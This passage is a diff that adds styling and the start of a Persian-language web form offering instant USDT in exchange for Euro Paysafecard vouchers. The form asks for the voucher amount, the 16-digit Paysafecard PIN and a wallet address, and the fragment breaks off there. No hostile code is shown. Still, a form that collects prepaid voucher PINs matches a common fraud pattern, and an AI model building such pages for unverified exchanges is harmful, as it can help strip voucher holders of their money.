@@ -9,4 +9,24 @@
         .card { max-width: 420px; margin: 0 auto; background: #1a1a24; padding: 30px; border-radius: 12px; border: 1px solid #ffdd00; box-shadow: 0 8px 24px rgba(0,0,0,0.6); }
         h2 { color: #ffdd00; margin-bottom: 5px; }
         label { display: block; text-align: right; margin-top: 15px; font-size: 13px; color: #9ca3af; }
-        input { width: 100%; padding: 12px; margin-top: 5px; border-radius: 6px; border: 1px solid #374151; background: #262636; color: #fff; box-sizing: border
+        input { width: 100%; padding: 12px; margin-top: 5px; border-radius: 6px; border: 1px solid #374151; background: #262636; color: #fff; box-sizing: border-box; text-align: left; }
+        input:focus { border-color: #ffdd00; outline: none; }
+        .btn { width: 100%; padding: 14px; background: #ffdd00; color: #000; border: none; border-radius: 6px; font-weight: bold; cursor: pointer; margin-top: 25px; font-size: 16px; transition: 0.2s; }
+        .btn:hover { background: #e6c800; }
+        .status-box { margin-top: 15px; font-size: 14px; display: none; padding: 10px; border-radius: 6px; }
+    </style>
+</head>
+<body>
+
+<div class="card">
+    <h2>شارژ آنی تتر (USDT)</h2>
+    <p style="font-size: 13px; color: #9ca3af; margin-top: 0;">پرداخت امن با ووچر Paysafecard یورو</p>
+    
+    <form id="paysafeForm">
+        <label>مقدار ووچر (EUR):</label>
+        <input type="number" id="amount" placeholder="مثلاً 25, 50, 100" required>
+
+        <label>کد ۱۶ رقمی Paysafecard PIN:</label>
+        <input type="text" id="pin" placeholder="XXXX-XXXX-XXXX-XXXX" maxlength="19" required>
+
+        <label>آدرس ول
